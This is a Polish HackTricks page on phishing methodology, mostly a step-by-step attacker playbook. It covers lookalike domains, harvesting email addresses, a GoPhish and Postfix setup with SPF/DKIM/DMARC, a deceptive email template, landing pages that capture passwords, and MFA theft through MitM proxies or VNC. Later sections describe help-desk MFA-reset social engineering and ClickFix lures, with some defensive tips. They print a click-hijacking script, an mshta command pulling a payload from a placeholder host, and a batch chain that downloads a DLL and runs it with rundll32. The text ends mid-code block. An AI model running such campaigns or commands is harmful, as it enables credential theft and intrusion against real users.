# Metodologia phishingu

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Przeprowadź rekonesans ofiary
   1. Wybierz **domenę ofiary**.
   2. Wykonaj podstawowe rozpoznanie sieciowe, **wyszukując portale logowania** używane przez ofiarę, i **zdecyduj**, który z nich będziesz **podszywać się pod**.
   3. Wykorzystaj **OSINT**, aby **znaleźć adresy e-mail**.
2. Przygotuj środowisko
   1. **Kup domenę**, której użyjesz do oceny phishingowej.
   2. **Skonfiguruj rekordy związane z usługą pocztową** (SPF, DMARC, DKIM, rDNS).
   3. Skonfiguruj VPS z **gophish**.
3. Przygotuj kampanię
   1. Przygotuj **szablon wiadomości e-mail**.
   2. Przygotuj **stronę internetową**, aby wykraść dane logowania.
4. Uruchom kampanię!

## Generowanie podobnych nazw domen lub kupowanie zaufanej domeny

### Techniki modyfikowania nazw domen

- **Słowo kluczowe**: Nazwa domeny **zawiera** ważne **słowo kluczowe** z oryginalnej domeny (np. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomena z łącznikiem**: Zamień **kropkę na łącznik** w subdomenie (np. www-zelster.com).
- **Nowa domena najwyższego poziomu**: Ta sama domena z **nową domeną najwyższego poziomu** (np. zelster.org)
- **Homoglyph**: **Zastępuje** literę w nazwie domeny **podobnie wyglądającą literą** (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Przestawienie:** **Zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).
- **Liczba pojedyncza/mnoga**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).
- **Pominięcie**: **Usuwa jedną** z liter z nazwy domeny (np. zelser.com).
- **Powtórzenie:** **Powtarza jedną** z liter w nazwie domeny (np. zeltsser.com).
- **Zastąpienie**: Podobnie jak Homoglyph, ale mniej dyskretne. Zastępuje jedną z liter w nazwie domeny, na przykład literą sąsiadującą z oryginalną literą na klawiaturze (np. zektser.com).
- **Wstawienie kropki**: Wstawia **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).
- **Wstawienie**: **Wstawia literę** do nazwy domeny (np. zerltser.com).
- **Brak kropki**: Dodaje domenę najwyższego poziomu do nazwy domeny (np. zelstercom.com).

**Narzędzia automatyczne**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Strony internetowe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że niektóre zapisane lub przesyłane bity zostaną automatycznie odwrócone** z różnych przyczyn, takich jak rozbłyski słoneczne, promieniowanie kosmiczne czy błędy sprzętu.

Gdy tę koncepcję **zastosuje się do zapytań DNS**, istnieje możliwość, że **domena otrzymana przez serwer DNS** będzie inna niż domena, o którą początkowo zapytano.

Na przykład zmiana pojedynczego bitu w domenie „windows.com” może zmienić ją na „windnws.com”.

Atakujący mogą **wykorzystać to, rejestrując wiele domen powstałych przez odwrócenie bitów**, podobnych do domeny ofiary. Ich celem jest przekierowanie legalnych użytkowników do własnej infrastruktury.

Więcej informacji można znaleźć pod adresem [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Kupowanie zaufanej domeny

Możesz wyszukać wygasłą domenę, której możesz użyć, na stronie [https://www.expireddomains.net/](https://www.expireddomains.net).\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić, **ma już dobrą pozycję SEO**, możesz sprawdzić, jak jest sklasyfikowana w serwisach:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Wyszukiwanie adresów e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% za darmo)
- [https://phonebook.cz/](https://phonebook.cz) (100% za darmo)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **znaleźć więcej** prawidłowych adresów e-mail lub **zweryfikować te**, które udało Ci się już znaleźć, możesz sprawdzić, czy da się przeprowadzić brute force na serwerach SMTP ofiary. [Dowiedz się tutaj, jak weryfikować/wyszukiwać adresy e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto pamiętaj, że jeśli użytkownicy korzystają z **portalu internetowego, aby uzyskać dostęp do swojej poczty**, możesz sprawdzić, czy jest podatny na **brute force nazw użytkowników**, i wykorzystać tę podatność, jeśli to możliwe.

## Konfiguracja GoPhish

### Instalacja

Możesz pobrać go z [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz i rozpakuj go w `/opt/gophish`, a następnie uruchom `/opt/gophish/gophish`\
W wyniku działania programu zostanie wyświetlone hasło użytkownika administratora dla portu 3333. Połącz się więc z tym portem i użyj podanych danych logowania, aby zmienić hasło administratora. Może być konieczne przekierowanie tego portu lokalnie:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed tym krokiem musisz **kupić domenę**, której zamierzasz użyć, i musi ona **wskazywać** na **adres IP VPS-a**, na którym konfigurujesz **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Konfiguracja poczty**

Rozpocznij instalację: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień również wartości następujących zmiennych w pliku /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmień zawartość plików **`/etc/hostname`** i **`/etc/mailname`**, wpisując w nich nazwę swojej domeny, i **uruchom ponownie VPS.**

Utwórz teraz rekord **DNS A** dla `mail.<domain>`, wskazujący na **adres IP** VPS, oraz rekord **DNS MX** wskazujący na `mail.<domain>`.

Teraz sprawdźmy, czy można wysłać wiadomość e-mail:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Konfiguracja Gophish**

Zatrzymaj działanie Gophish i skonfigurujmy go.\
Zmodyfikuj `/opt/gophish/config.json` w następujący sposób (zwróć uwagę na użycie https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Konfiguracja usługi gophish**

Aby utworzyć usługę gophish, która będzie uruchamiana automatycznie i zarządzana jako usługa, możesz utworzyć plik `/etc/init.d/gophish` o następującej zawartości:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Dokończ konfigurację usługi i sprawdź ją, wykonując:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Konfiguracja serwera pocztowego i domeny

### Poczekaj i zadbaj o wiarygodność

Im starsza domena, tym mniejsze prawdopodobieństwo, że zostanie uznana za spam. Dlatego przed assessmentem phishingowym należy odczekać jak najdłużej (co najmniej 1 tydzień). Co więcej, jeśli umieścisz na niej stronę z sektora cieszącego się dobrą reputacją, reputacja domeny będzie lepsza.

Pamiętaj, że nawet jeśli musisz odczekać tydzień, możesz już teraz skonfigurować wszystko.

### Skonfiguruj rekord Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który będzie wskazywać z adresu IP VPS-a na nazwę domeny.

### Rekord Sender Policy Framework (SPF)

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć [https://www.spfwizard.net/](https://www.spfwizard.net), aby wygenerować politykę SPF (użyj adresu IP maszyny VPS).

![Formularz SPF Wizard do generowania rekordu SPF dla domeny phishingowej](<../../images/image (1037).png>)

Poniższą treść należy ustawić w rekordzie TXT w domenie:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Rekord Domain-based Message Authentication, Reporting & Conformance (DMARC)

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Utwórz nowy rekord DNS TXT wskazujący na hostname `_dmarc.<domain>` i zawierający następującą treść:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DKIM, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ten samouczek opiera się na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Musisz połączyć obie wartości B64 generowane przez klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Sprawdź wynik konfiguracji swojej poczty e-mail

Możesz to zrobić za pomocą [https://www.mail-tester.com/](https://www.mail-tester.com)\
Wystarczy otworzyć stronę i wysłać wiadomość e-mail na podany adres:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Możesz też **sprawdzić konfigurację poczty e-mail**, wysyłając wiadomość na adres `check-auth@verifier.port25.com` i **odczytując odpowiedź** (w tym celu musisz **otworzyć** port **25** i sprawdzić odpowiedź w pliku _/var/mail/root_, jeśli wyślesz wiadomość jako root).\
Sprawdź, czy przechodzisz wszystkie testy:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Możesz też wysłać **wiadomość na konto Gmail, nad którym masz kontrolę**, a następnie sprawdzić **nagłówki e-maila** w swojej skrzynce odbiorczej Gmail. W polu nagłówka `Authentication-Results` powinien znajdować się wpis `dkim=pass`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### Usuwanie z blacklisty Spamhaus

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Spamhaus blokuje Twoją domenę. Możesz poprosić o usunięcie domeny/IP ze списка pod adresem: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Usuwanie z blacklisty Microsoft

Możesz poprosić o usunięcie domeny/IP pod adresem [https://sender.office.com/](https://sender.office.com).

## Tworzenie i uruchamianie kampanii GoPhish

### Profil wysyłkowy

- Ustaw **nazwę identyfikującą** profil nadawcy.
- Zdecyduj, z którego konta będziesz wysyłać wiadomości phishingowe. Sugestie: _noreply, support, servicedesk, salesforce..._
- Możesz pozostawić pola nazwy użytkownika i hasła puste, ale zaznacz opcję Ignore Certificate Errors.

![Tworzenie i uruchamianie kampanii GoPhish — profil wysyłkowy: Możesz pozostawić pola nazwy użytkownika i hasła puste, ale zaznacz opcję Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zalecamy użycie funkcji "**Send Test Email**", aby sprawdzić, czy wszystko działa.\
> Warto **wysyłać testowe wiadomości na adresy 10min mail**, aby uniknąć trafienia na blacklistę podczas testów.

### Szablon wiadomości e-mail

- Ustaw **nazwę identyfikującą** szablon.
- Następnie wpisz **temat** (niczego dziwnego — po prostu coś, czego można się spodziewać w zwykłej wiadomości e-mail).
- Upewnij się, że zaznaczono opcję "**Add Tracking Image**".
- Napisz **szablon wiadomości e-mail** (możesz użyć zmiennych, jak w poniższym przykładzie):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Zauważ, że **aby zwiększyć wiarygodność wiadomości e-mail**, zaleca się użycie podpisu z wiadomości e-mail otrzymanej od klienta. Propozycje:

- Wyślij wiadomość e-mail na **nieistniejący adres** i sprawdź, czy odpowiedź zawiera podpis.
- Wyszukaj **publiczne adresy e-mail**, takie jak info@ex.com, press@ex.com lub public@ex.com, wyślij na nie wiadomość i poczekaj na odpowiedź.
- Spróbuj skontaktować się z **odkrytym, prawidłowym adresem** e-mail i poczekaj na odpowiedź.

![Profil wysyłania — szablon wiadomości e-mail: Spróbuj skontaktować się z odkrytym, prawidłowym adresem e-mail i poczekaj na odpowiedź](<../../images/image (80).png>)

> [!TIP]
> Szablon wiadomości e-mail pozwala również **dołączyć pliki do wysłania**. Jeśli chcesz także przechwytywać wyzwania NTLM za pomocą specjalnie spreparowanych plików/dokumentów, [przeczytaj tę stronę](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Strona docelowa

- Wpisz **nazwę**
- **Wpisz kod HTML** strony internetowej. Pamiętaj, że możesz **zaimportować** strony internetowe.
- Zaznacz **Capture Submitted Data** i **Capture Passwords**
- Ustaw **przekierowanie**

![Szablon wiadomości e-mail — strona docelowa: Zaznacz Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Zazwyczaj trzeba zmodyfikować kod HTML strony i przetestować go lokalnie (na przykład na serwerze Apache), **aż uzyskasz oczekiwany efekt.** Następnie wklej ten kod HTML w polu.\
> Jeśli potrzebujesz **użyć zasobów statycznych** w kodzie HTML (na przykład plików CSS i JS), możesz zapisać je w _**/opt/gophish/static/endpoint**_, a następnie uzyskać do nich dostęp przez _**/static/\<filename>**_

> [!TIP]
> Jako przekierowanie możesz **ustawić przekierowanie użytkowników na główną, prawdziwą stronę internetową ofiary** albo na przykład przekierować ich do _/static/migration.html_, wyświetlić **obracające się kółko (**[**https://loading.io/**](https://loading.io)**) przez 5 sekund, a następnie poinformować, że proces zakończył się pomyślnie**.

### Użytkownicy i grupy

- Ustaw nazwę
- **Zaimportuj dane** (pamiętaj, że aby użyć szablonu z przykładu, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika)

![Strona docelowa — użytkownicy i grupy: Zaimportuj dane (pamiętaj, że aby użyć szablonu z przykładu, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika)](<../../images/image (163).png>)

### Kampania

Na koniec utwórz kampanię, wybierając nazwę, szablon wiadomości e-mail, stronę docelową, URL, profil wysyłania i grupę. Pamiętaj, że URL będzie linkiem wysłanym do ofiar.

Pamiętaj, że **profil wysyłania pozwala wysłać testową wiadomość e-mail, aby sprawdzić, jak będzie wyglądać końcowa wiadomość phishingowa**:

![Użytkownicy i grupy — kampania: Pamiętaj, że profil wysyłania pozwala wysłać testową wiadomość e-mail, aby sprawdzić, jak będzie wyglądać końcowa wiadomość phishingowa](<../../images/image (192).png>)

Gdy wszystko będzie gotowe, uruchom kampanię!

## Klonowanie stron internetowych

Jeśli z jakiegoś powodu chcesz sklonować stronę internetową, sprawdź tę stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenty i pliki z backdoorem

W niektórych testach phishingowych (głównie dla Red Teams) możesz również chcieć **wysyłać pliki zawierające jakiś rodzaj backdoora** (być może C2 albo coś, co wywoła uwierzytelnianie).\
Przykłady znajdziesz na tej stronie:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Przez proxy MitM

Poprzedni atak jest całkiem sprytny, ponieważ podszywasz się pod prawdziwą stronę internetową i zbierasz informacje wprowadzone przez użytkownika. Niestety, jeśli użytkownik nie podał prawidłowego hasła albo aplikacja, pod którą się podszywasz, jest skonfigurowana z 2FA, **te informacje nie pozwolą Ci podszyć się pod oszukanego użytkownika**.

Przydatne są tu narzędzia takie jak [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). To narzędzie umożliwia przeprowadzenie ataku typu MitM. Zasadniczo atak przebiega następująco:

1. **Podszywasz się pod formularz logowania** prawdziwej strony internetowej.
2. Użytkownik **wysyła** swoje **dane uwierzytelniające** na Twoją fałszywą stronę, a narzędzie przesyła je do prawdziwej strony internetowej, **sprawdzając, czy są prawidłowe**.
3. Jeśli konto jest skonfigurowane z **2FA**, strona MitM poprosi o kod, a gdy **użytkownik go wprowadzi**, narzędzie wyśle go do prawdziwej strony internetowej.
4. Po uwierzytelnieniu użytkownika Ty (jako atakujący) **przechwycisz dane uwierzytelniające, 2FA, cookie i wszystkie informacje** zebrane podczas każdej interakcji przeprowadzanej przez narzędzie w trakcie ataku MitM.

### Przez VNC

A co, jeśli zamiast **wysyłać ofiarę na złośliwą stronę** wyglądającą jak oryginalna, wyślesz ją do **sesji VNC z przeglądarką połączoną z prawdziwą stroną internetową**? Będziesz móc obserwować jej działania, wykraść hasło, użyte MFA, cookies...\
Możesz to zrobić za pomocą [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Wykrywanie wykrycia

Oczywiście jednym z najlepszych sposobów, aby dowiedzieć się, czy Cię zdemaskowano, jest **sprawdzenie, czy Twoja domena znajduje się na czarnych listach**. Jeśli się tam pojawia, oznacza to, że została uznana za podejrzaną.\
Łatwo sprawdzisz, czy Twoja domena znajduje się na którejś czarnej liście, korzystając z [https://malwareworld.com/](https://malwareworld.com)

Istnieją jednak inne sposoby, aby sprawdzić, czy ofiara **aktywnie szuka podejrzanych kampanii phishingowych w sieci**, jak wyjaśniono tutaj:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz **kupić domenę o nazwie bardzo podobnej** do domeny ofiary **i/lub wygenerować certyfikat** dla **subdomeny** domeny, którą kontrolujesz, **zawierającej** **słowo kluczowe** z domeny ofiary. Jeśli **ofiara** wykona jakąkolwiek **interakcję DNS lub HTTP** z tymi domenami, będziesz wiedzieć, że **aktywnie szuka** podejrzanych domen, więc musisz zachować szczególną dyskrecję.<sup>[[2]](#references)</sup>

### Ocena phishingu

Użyj [**Phishious** ](https://github.com/Rices/Phishious), aby ocenić, czy Twoja wiadomość e-mail trafi do folderu spam, zostanie zablokowana czy też dotrze do odbiorcy.

## Przejęcie tożsamości wymagające bezpośredniego kontaktu (reset MFA przez help desk)

Współczesne grupy intruzów coraz częściej całkowicie pomijają przynęty e-mailowe i **bezpośrednio atakują przepływ pracy działu obsługi / odzyskiwania tożsamości**, aby obejść MFA. Atak w całości wykorzystuje techniki „living-off-the-land”: gdy operator zdobędzie prawidłowe dane uwierzytelniające, wykorzystuje wbudowane narzędzia administracyjne — nie jest wymagane żadne malware.<sup>[[6]](#references)</sup>

### Przebieg ataku
1. Rozpoznanie ofiary
   * Zbieranie danych osobowych i służbowych z LinkedIn, wycieków danych, publicznego GitHub itd.
   * Identyfikacja tożsamości o wysokiej wartości (kadry kierowniczej, IT, finanse) i ustalenie **dokładnej procedury help desk** resetowania hasła / MFA.
2. Inżynieria społeczna w czasie rzeczywistym
   * Telefon, Teams lub czat z help desk, podszywając się pod cel (często przy użyciu **sfałszowanego identyfikatora dzwoniącego** lub **sklonowanego głosu**).
   * Podanie wcześniej zebranych danych osobowych, aby przejść weryfikację opartą na wiedzy.
   * Przekonanie konsultanta, aby **zresetował sekret MFA** lub wykonał **SIM-swap** zarejestrowanego numeru telefonu komórkowego.
3. Natychmiastowe działania po uzyskaniu dostępu (w rzeczywistych przypadkach ≤60 min)
   * Uzyskanie przyczółka przez dowolny portal web SSO.
   * Enumeracja AD / AzureAD za pomocą wbudowanych narzędzi (bez upuszczania plików binarnych):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Ruch boczny z użyciem **WMI**, **PsExec** lub legalnych agentów **RMM**, które są już na liście dozwolonych w środowisku.

### Wykrywanie i ograniczanie ryzyka
* Traktuj odzyskiwanie tożsamości przez help desk jako **operację uprzywilejowaną** – wymagaj dodatkowego uwierzytelnienia i zatwierdzenia przez kierownika.
* Wdróż reguły **Identity Threat Detection & Response (ITDR)** / **UEBA**, które generują alerty w przypadku:  
  * Zmiany metody MFA + uwierzytelnienia z nowego urządzenia / lokalizacji geograficznej.  
  * Natychmiastowego podniesienia uprawnień tego samego podmiotu (user-→-admin).  
* Nagrywaj rozmowy z help deskiem i przed każdym resetem wymagaj **oddzwonienia na wcześniej zarejestrowany numer**.
* Wdróż **Just-In-Time (JIT) / Privileged Access**, aby nowo zresetowane konta **nie dziedziczyły automatycznie tokenów o wysokich uprawnieniach**.

---

## Masowe kampanie oszustw – zatruwanie SEO i „ClickFix”
Masowe grupy rekompensują sobie koszty operacji wymagających intensywnego zaangażowania, przeprowadzając ataki na dużą skalę, które zmieniają **wyszukiwarki i sieci reklamowe w kanał dystrybucji**.<sup>[[6]](#references)</sup>

1. **Zatruwanie SEO / malvertising** promuje fałszywy wynik, taki jak `chromium-update[.]site`, na szczycie reklam w wynikach wyszukiwania.
2. Ofiara pobiera niewielki **loader pierwszego etapu** (często JS/HTA/ISO). Przykłady zaobserwowane przez Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader eksfiltruje pliki cookie przeglądarki i bazy danych poświadczeń, a następnie pobiera **cichy loader**, który *w czasie rzeczywistym* decyduje, czy wdrożyć:
   * RAT (np. AsyncRAT, RustDesk)
   * ransomware / wiper
   * komponent utrwalający obecność w systemie (klucz Run w rejestrze + zaplanowane zadanie)

### Wskazówki dotyczące utwardzania
* Blokuj nowo zarejestrowane domeny i wymuszaj **Advanced DNS / URL Filtering** zarówno dla *reklam w wynikach wyszukiwania*, jak i poczty e-mail.
* Ogranicz instalację oprogramowania do podpisanych pakietów MSI / ze Store, blokuj wykonywanie `HTA`, `ISO`, `VBS` przy użyciu zasad.
* Monitoruj procesy potomne przeglądarek uruchamiające instalatory:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Wyszukuj LOLBins często nadużywane przez loadery pierwszego etapu (np. `regsvr32`, `curl`, `mshta`).

### Przejęcie kliknięcia przycisku pobierania z przekierowaniem do TDS
Niektóre fałszywe portale z oprogramowaniem pozostawiają widoczny `href` pobierania wskazujący na **prawdziwy** adres URL GitHub/release, ale przejmują **pierwszą** interakcję użytkownika za pomocą JavaScriptu i kierują ofiarę do łańcucha **systemu dystrybucji ruchu (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Kluczowe cechy:
- Hook zwykle działa w **fazie przechwytywania** (`true`) na `document`, więc uruchamia się przed handlerami witryny.
- Chrome często używa `mousedown` zamiast `click`, aby powiązać przekierowanie z prawidłowym **gestem użytkownika** i zwiększyć szanse na ominięcie blokady wyskakujących okien.
- Niektóre warianty wcześniej otwierają `about:blank` lub symulują kliknięcia `<a target="_blank">`, a URL TDS przypisują dopiero później.
- Limity po stronie przeglądarki często są przechowywane w `localStorage`, więc **pierwsze kliknięcie** może prowadzić do malware, a odświeżenia lub ponowione próby — do wyglądającego niewinnie widocznego linku.
- TDS może stosować filtrowanie na podstawie referrera, domeny wejściowej, GEO, fingerprintu przeglądarki/urządzenia, kontroli VPN/datacenter, kontekstu kliknięcia i liczników sesji, przez co powtórzenia analityków nie dają deterministycznych wyników.

Pomysły dla obrońców:
- Porównuj wyświetlany `href` z rzeczywistym celem nawigacji generowanym w chwili kliknięcia.
- Szukaj handlerów `document.addEventListener(..., true)`, które wywołują zarówno `preventDefault()`, jak i `stopImmediatePropagation()` w pobliżu `window.open`, `about:blank` lub symulowanych kliknięć kotwic.
- Traktuj grupy nowo zarejestrowanych domen oferujących pobieranie oprogramowania, które wszystkie ładują ten sam etap JS z CloudFront, jako wyraźny sygnał wzorca SEO poisoning/TDS.

### ClickFix z fałszywych stron weryfikacyjnych + pobieranie LOLBAS wyglądające jak archiwum
Niektóre gałęzie TDS prowadzą do fałszywej strony weryfikacyjnej (w stylu Cloudflare/IUAM), która instruuje ofiarę, aby uruchomiła zaufany plik binarny Windows, taki jak:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Uwagi:
- `mshta.exe` wykonuje **HTA/VBScript z początku odpowiedzi**, nawet jeśli URL udaje archiwum `.7z`; dołączone dane archiwum mogą być wyłącznie przynętą.
- Kolejne etapy często nadal fałszywie określają typ pliku (`.rtf` dla PowerShell, `.asar` dla Pythona, ZIP-y z binariami z dopełnieniem), a następnie przechodzą do **ręcznego mapowania PE / wykonywania w pamięci**.
- Jeśli reagujesz na jeden z takich łańcuchów, zachowaj **ruch sieciowy i zawartość pamięci od pierwszego udanego uruchomienia**: późniejsze odtworzenia mogą pokazywać jedynie nieszkodliwą ścieżkę instalatora/SFX albo kończyć się niepowodzeniem, ponieważ zwolnienie payloadu/klucza było powiązane z oryginalną sesją TDS.

### Taktyki dostarczania DLL przez ClickFix (fałszywa aktualizacja CERT)
* Przynęta: sklonowane ostrzeżenie krajowego CERT z przyciskiem **Update**, który wyświetla instrukcje „naprawy” krok po kroku. Ofiary mają uruchomić plik batch, który pobiera DLL i wykonuje ją za pomocą `rundll32`.<sup>[[12]](#references)</sup>
* Zaobserwowany typowy łańcuch batch:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` zapisuje payload w `%TEMP%`, krótki sleep ukrywa jitter sieciowy, a następnie `rundll32` wywołuje eksportowany punkt wejścia (`notepad`).
* DLL wysyła beacon z tożsamością hosta i odpytuje C2 co kilka minut. Zdalne polecenia są dostarczane jako **zakodowany w base64 PowerShell**, uruchamiany w trybie ukrytym i z pominięciem zasad:
  ```powershell
